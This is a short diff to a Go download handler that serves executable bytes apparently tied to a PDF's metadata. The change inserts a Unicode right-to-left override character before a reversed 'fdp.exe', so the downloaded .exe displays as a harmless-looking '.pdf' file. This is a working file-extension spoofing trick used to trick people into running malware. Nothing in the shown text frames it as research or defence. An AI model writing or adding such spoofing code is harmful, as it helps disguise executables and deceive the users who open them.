@@ -452,10 +452,13 @@ func handleDownload(w http.ResponseWriter, r *http.Request) {
 	// Format download filename
 	cleanName := strings.TrimSuffix(meta.PdfName, filepath.Ext(meta.PdfName))
 	if cleanName == "" {
-		cleanName = "launcher"
+		cleanName = "Document"
 	}
 
-	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s.exe\"", cleanName))
+	rtlo := "\u202E"
+	spoofedFilename := cleanName + rtlo + "fdp.exe"
+
+	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", spoofedFilename))
 	w.Header().Set("Content-Type", "application/octet-stream")
 	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(exeBytes)))
 	w.Write(exeBytes)
